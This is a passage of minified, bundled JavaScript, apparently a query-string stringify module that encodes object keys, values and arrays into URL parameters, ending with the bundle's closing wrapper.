                return e ? "true" : "false";
            case "number":
                return isFinite(e) ? e : "";
            default:
                return ""
            }
        };
        e.exports = function(e, t, r, n) {
            return t = t || "&",
            r = r || "=",
            null === e && (e = void 0),
            "object" == typeof e ? Object.keys(e).map(function(n) {
                var o = encodeURIComponent(i(n)) + r;
                return Array.isArray(e[n]) ? e[n].map(function(e) {
                    return o + encodeURIComponent(i(e))
                }).join(t) : o + encodeURIComponent(i(e[n]))
            }).join(t) : n ? encodeURIComponent(i(n)) + r + encodeURIComponent(i(e)) : ""
        }
    }
    , function(e, t, r) {
        e.exports = r(11)
    }
    ])
});
